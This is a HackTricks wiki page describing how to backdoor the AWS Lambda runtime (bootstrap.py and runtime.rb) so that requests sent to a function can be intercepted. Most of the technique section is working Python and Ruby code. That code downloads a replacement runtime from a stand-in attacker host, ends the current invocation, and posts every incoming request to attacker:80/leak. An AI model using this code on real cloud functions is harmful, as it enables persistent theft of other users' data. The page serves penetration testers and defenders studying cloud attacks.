# AWS - Steal Lambda Requests

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Introduction <a href="#python-runtime" id="python-runtime"></a>

This attack supposes that you have some kind of **access over a running Lambda**.\
Also, something important to note is that **Lambda invocations aren‚Äôt completely separated from each other but are isolated**. They could run, though not simultaneously, in the same execution environment. With that in mind, let‚Äôs start dissecting that environment.

### Isolation

Lambda isolation uses thi cgroups:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

As the prefix 'sandbox' didn‚Äôt match any common container engine(docker, podman, LXD, rkt), it could be a proprietary container engine, which could be internally using an open source container runtime like [runC](https://github.com/opencontainers/runc).

### How Lambdas work  <a href="#python-runtime" id="python-runtime"></a>

This appears to be the python Lambda architecture:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. A process outside the container, referred to as the "**slicer"** in the init binary, sends invocation events to the **init** process via shared memory.
2. The init process sets up an HTTP server on port 9001 (hard-coded), with several exposed endpoints:
   1. `/2018-06-01/runtime/invocation/`**`next`** ‚Äì get the next invocation event
   2. `/2018-06-01/runtime/invocation/{invoke-id}/`**`response`** ‚Äì return the handler response for the invoke
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì return an execution error
3.  In `bootstrap.py` the following loop **queries the init process for a new event**, and then **calls the user‚Äôs function** to handle it (here, the request handler you uploaded runs).\


    <figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
4. The **handler response is then sent back to the init process** through one of the following endpoints:
   1. `/{invoke-id}/response` ‚Äì if the user handler executed successfully
   2. `/{invoke-id}/error` ‚Äì if an exception was raised during the handling of the invoke

## Technique Summary <a href="#python-runtime" id="python-runtime"></a>

It's possible to **substitute the bootstrap script** with malicious code to be able to **intercept data** sent to the Lambda function.\
Note tha**t other engines in other languages** have another **bootstrap** **script** written in that language, so this can be done **also in other lambdas using other languages**, not only in python.

## Python <a href="#python-runtime" id="python-runtime"></a>

From the lambda, download **`/var/runtime/bootstrap.py`**  (or just spin up **your own lambda** and get it) and add the backdoor that will be leaking all the data sent to Lambda. You just need to add a couple of lines such as:

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Replacing Runtime

Now with the new **`boostrap.py` created**, it's possible to **download** it, **end the current lambda** **invocation** and run it to **replace** the legit one:

```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
    f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```

Or you could also use [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), which will end the invocation as done previously, run the new bootstrap and exfiltrate the information.

{% hint style="warning" %}
If a lambda function is not used for 5-15 minutes it will be shut down, and all the changes will be lost the next time it's invoked.
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

In ruby, the file you want to backdoor is **`/var/runtime/lib/runtime.rb`** file (get it from the system or running your own lambda).

Adding a backdoor is as simple as done in the python version:

```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin 
    context = lambdaContext.new(raw_request)
    uri = URI('http://attacker:80/leak')
    Net::HTTP.post(uri,JSON.generate(request))
    [...]
```

Then, you just need to do what you did in the python version with just a change:

* **Download the backdoor in a directory**
* **Symlink** `/var/runtime/lib/*` with the directory where the backdoor is
* Finish the current lambda invocation

```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```

## References

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
